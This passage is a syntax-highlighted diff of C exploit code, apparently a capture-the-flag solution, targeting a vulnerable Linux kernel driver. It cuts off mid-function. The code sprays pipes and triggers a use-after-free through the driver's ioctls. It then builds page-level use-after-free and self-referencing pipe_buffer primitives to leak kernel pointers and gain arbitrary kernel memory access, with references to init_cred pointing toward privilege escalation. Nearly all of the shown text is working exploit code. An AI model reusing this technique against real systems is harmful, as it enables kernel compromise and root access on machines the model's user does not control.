+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> (<span style="color:#ff79c6">*</span>confirm)(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>release)(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> (<span style="color:#ff79c6">*</span>try_steal)(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> (<span style="color:#ff79c6">*</span>get)(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>size_t kernel_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81000000</span>;
+</span></span><span style="display:flex;"><span>size_t kernel_offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>size_t vmemmap_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffea0000000000</span>;
+</span></span><span style="display:flex;"><span>size_t page_offset_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffff888000000000</span>;
+</span></span><span style="display:flex;"><span>size_t init_task, init_nsproxy, init_cred;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span style="color:#bd93f9">2</span>];
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> dev_fd;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> victim_idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, origin_idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> snd_victim_idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, snd_origin_idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> self_pipe_idx_2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> self_pipe_idx_3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> self_pipe_idx_4 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> info_pipe_buf;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> evil_pipe_buf;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> evil_pipe_buf_2, evil_pipe_buf_3, evil_pipe_buf_4;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">char</span> temp_zero_buf[<span style="color:#bd93f9">0x1000</span>] <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">water_args</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">new_chunk</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">512</span>];
+</span></span><span style="display:flex;"><span>  memset(buffer, <span style="color:#bd93f9">0x44</span>, <span style="color:#ff79c6">sizeof</span>(buffer));
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">water_args</span> arg <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>      .buf <span style="color:#ff79c6">=</span> buffer,
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> ioctl(dev_fd, <span style="color:#bd93f9">0x20</span>, <span style="color:#ff79c6">&amp;</span>arg);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">delete_chunk</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">water_args</span> arg <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>      .buf <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>,
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> ioctl(dev_fd, <span style="color:#bd93f9">0x30</span>, <span style="color:#ff79c6">&amp;</span>arg);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">edit_chunk</span>(<span style="color:#8be9fd">char</span> c) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">water_args</span> arg <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>      .buf <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>c,
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> ioctl(dev_fd, <span style="color:#bd93f9">0x50</span>, <span style="color:#ff79c6">&amp;</span>arg);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">err_exit</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>msg) {
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;[-] error: %s&#34;</span>, msg);
+</span></span><span style="display:flex;"><span>  sleep(<span style="color:#bd93f9">5</span>);
+</span></span><span style="display:flex;"><span>  exit(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">debug</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>msg) {
+</span></span><span style="display:flex;"><span>  puts(msg);
+</span></span><span style="display:flex;"><span>  getchar();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">page_level_uaf</span>() {
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;spray pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; <span style="color:#ff79c6">++</span>i) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (pipe(spray_pipe_fd[i]) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>      err_exit(<span style="color:#f1fa8c">&#34;pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;new chunk then free&#34;</span>);
+</span></span><span style="display:flex;"><span>  new_chunk();
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// debug(&#34;write chunk data D&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  delete_chunk();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;get victim chunk&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i <span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    fcntl(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], F_SETPIPE_SZ, <span style="color:#bd93f9">0x1000</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;alloc pipe_buffer pages&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#f1fa8c">&#34;deadbeef&#34;</span>, <span style="color:#bd93f9">0x8</span>);
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>i, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>i, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>i, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#f1fa8c">&#34;deadbeef&#34;</span>, <span style="color:#bd93f9">0x8</span>);
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#f1fa8c">&#34;deadbeef&#34;</span>, <span style="color:#bd93f9">0x8</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;uaf change pipe-&gt;bufs-&gt;page&#34;</span>);
+</span></span><span style="display:flex;"><span>  edit_chunk(<span style="color:#bd93f9">0x00</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;find victim pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> tags[<span style="color:#bd93f9">0x10</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> nr;
+</span></span><span style="display:flex;"><span>    memset(tags, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(tags));
+</span></span><span style="display:flex;"><span>    read(spray_pipe_fd[i][<span style="color:#bd93f9">0</span>], tags, <span style="color:#bd93f9">8</span>);
+</span></span><span style="display:flex;"><span>    read(spray_pipe_fd[i][<span style="color:#bd93f9">0</span>], <span style="color:#ff79c6">&amp;</span>nr, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>strcmp(tags, <span style="color:#f1fa8c">&#34;deadbeef&#34;</span>) <span style="color:#ff79c6">&amp;&amp;</span> nr <span style="color:#ff79c6">!=</span> i) {
+</span></span><span style="display:flex;"><span>      origin_idx <span style="color:#ff79c6">=</span> nr;
+</span></span><span style="display:flex;"><span>      victim_idx <span style="color:#ff79c6">=</span> i;
+</span></span><span style="display:flex;"><span>      log_info(<span style="color:#f1fa8c">&#34;succeed find victim: %d, origin: %d&#34;</span>, victim_idx, origin_idx);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (victim_idx <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">||</span> origin_idx <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;find idx&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">second_page_level_uaf</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">0x400</span>];
+</span></span><span style="display:flex;"><span>  size_t snd_pipe_sz <span style="color:#ff79c6">=</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#bd93f9">0x1000</span> <span style="color:#ff79c6">*</span> (SND_PIPE_BUFS_SIZE <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;write something to no.1 victim pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[victim_idx][<span style="color:#bd93f9">1</span>], buffer,
+</span></span><span style="display:flex;"><span>        SND_PIPE_BUFS_SIZE <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">24</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;close no.1 origin idx pipe to page-level-uaf&#34;</span>);
+</span></span><span style="display:flex;"><span>  close(spray_pipe_fd[origin_idx][<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>  close(spray_pipe_fd[origin_idx][<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; <span style="color:#ff79c6">++</span>i) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">==</span> origin_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> victim_idx) <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (fcntl(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], F_SETPIPE_SZ, snd_pipe_sz) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>      err_exit(<span style="color:#f1fa8c">&#34;fcntl()&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  read(spray_pipe_fd[victim_idx][<span style="color:#bd93f9">0</span>], buffer,
+</span></span><span style="display:flex;"><span>       SND_PIPE_BUFS_SIZE <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>  read(spray_pipe_fd[victim_idx][<span style="color:#bd93f9">0</span>], <span style="color:#ff79c6">&amp;</span>info_pipe_buf, <span style="color:#ff79c6">sizeof</span>(info_pipe_buf));
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;page pointer: %p</span><span style="color:#f1fa8c">\n\t\t</span><span style="color:#f1fa8c">ops: %p&#34;</span>, info_pipe_buf.page,
+</span></span><span style="display:flex;"><span>           info_pipe_buf.ops);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ((size_t)info_pipe_buf.page <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0xffff000000000000</span> <span style="color:#ff79c6">||</span>
+</span></span><span style="display:flex;"><span>      (size_t)info_pipe_buf.ops <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0xffffffff81000000</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;FAILED to re-hit victim page!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;hit the UAF page successful&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;construct no.2 page level uaf&#34;</span>);
+</span></span><span style="display:flex;"><span>  info_pipe_buf.page <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)(<span style="color:#bd93f9">0x40</span> <span style="color:#ff79c6">+</span> (size_t)info_pipe_buf.page);
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[victim_idx][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>info_pipe_buf, <span style="color:#ff79c6">sizeof</span>(info_pipe_buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;try find no.2 page uaf by pipe tags&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">==</span> origin_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> victim_idx) {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> nr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>    read(spray_pipe_fd[i][<span style="color:#bd93f9">0</span>], <span style="color:#ff79c6">&amp;</span>nr, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// printf(&#34;%#x\n&#34;, nr);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (nr <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS <span style="color:#ff79c6">&amp;&amp;</span> nr <span style="color:#ff79c6">!=</span> i) {
+</span></span><span style="display:flex;"><span>      snd_origin_idx <span style="color:#ff79c6">=</span> nr;
+</span></span><span style="display:flex;"><span>      snd_victim_idx <span style="color:#ff79c6">=</span> i;
+</span></span><span style="display:flex;"><span>      log_info(<span style="color:#f1fa8c">&#34;find second pipe victim_idx: %d&#34;</span>, snd_victim_idx);
+</span></span><span style="display:flex;"><span>      log_info(<span style="color:#f1fa8c">&#34;find second pipe origin_idx: %d&#34;</span>, snd_origin_idx);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (snd_victim_idx <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">||</span> snd_origin_idx <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;failed find snd pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;find no.2 idx sucessfully&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">construct_self_pipe</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">0x1000</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>page_ptr;
+</span></span><span style="display:flex;"><span>  size_t trd_pipe_sz <span style="color:#ff79c6">=</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#bd93f9">0x1000</span> <span style="color:#ff79c6">*</span> (TRD_PIPE_BUFS_SIZE <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;write to no.2 victim pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[snd_victim_idx][<span style="color:#bd93f9">1</span>], buffer,
+</span></span><span style="display:flex;"><span>        TRD_PIPE_BUFS_SIZE <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">24</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;close no.2 origin pipe to make second page level uaf&#34;</span>);
+</span></span><span style="display:flex;"><span>  close(spray_pipe_fd[snd_origin_idx][<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>  close(spray_pipe_fd[snd_origin_idx][<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; <span style="color:#ff79c6">++</span>i) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">==</span> origin_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> snd_origin_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> victim_idx <span style="color:#ff79c6">||</span>
+</span></span><span style="display:flex;"><span>        i <span style="color:#ff79c6">==</span> snd_victim_idx) {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (fcntl(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], F_SETPIPE_SZ, trd_pipe_sz) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>      err_exit(<span style="color:#f1fa8c">&#34;fcntl() pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;hijack pipe 2 page to itself&#34;</span>);
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.page <span style="color:#ff79c6">=</span> info_pipe_buf.page;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.offset <span style="color:#ff79c6">=</span> TRD_PIPE_BUFS_SIZE;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.len <span style="color:#ff79c6">=</span> TRD_PIPE_BUFS_SIZE;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.ops <span style="color:#ff79c6">=</span> info_pipe_buf.ops;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.flags <span style="color:#ff79c6">=</span> info_pipe_buf.flags;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.<span style="color:#ff79c6">private</span> <span style="color:#ff79c6">=</span> info_pipe_buf.<span style="color:#ff79c6">private</span>;
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[snd_victim_idx][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;try find pipe 2 idx&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">==</span> origin_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> victim_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> snd_origin_idx <span style="color:#ff79c6">||</span>
+</span></span><span style="display:flex;"><span>        i <span style="color:#ff79c6">==</span> snd_victim_idx) {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    read(spray_pipe_fd[i][<span style="color:#bd93f9">0</span>], <span style="color:#ff79c6">&amp;</span>page_ptr, <span style="color:#ff79c6">sizeof</span>(page_ptr));
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// printf(&#34;page ptr: %#lx&#34;, (size_t)page_ptr);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (page_ptr <span style="color:#ff79c6">==</span> evil_pipe_buf.page) {
+</span></span><span style="display:flex;"><span>      self_pipe_idx_2 <span style="color:#ff79c6">=</span> i;
+</span></span><span style="display:flex;"><span>      log_info(<span style="color:#f1fa8c">&#34;Found self pipe 2: %d&#34;</span>, self_pipe_idx_2);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (self_pipe_idx_2 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;FAILED to build a self-writing pipe 2!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;hijack pipe 3 page to itself&#34;</span>);
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.offset <span style="color:#ff79c6">=</span> TRD_PIPE_BUFS_SIZE;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.len <span style="color:#ff79c6">=</span> TRD_PIPE_BUFS_SIZE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[snd_victim_idx][<span style="color:#bd93f9">1</span>], buffer,
+</span></span><span style="display:flex;"><span>        TRD_PIPE_BUFS_SIZE <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf));
